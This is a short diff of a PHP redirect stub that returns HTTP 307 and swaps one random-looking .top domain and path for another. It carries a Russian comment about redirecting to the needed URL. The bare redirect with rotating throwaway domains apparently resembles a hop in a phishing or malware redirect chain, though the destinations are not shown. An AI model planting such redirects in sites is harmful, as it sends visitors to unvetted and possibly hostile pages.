@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://serversolirax.top/sQHdhb');
+header('Location: https://serverserixat.top/p3czLm');
 exit();
 ?>
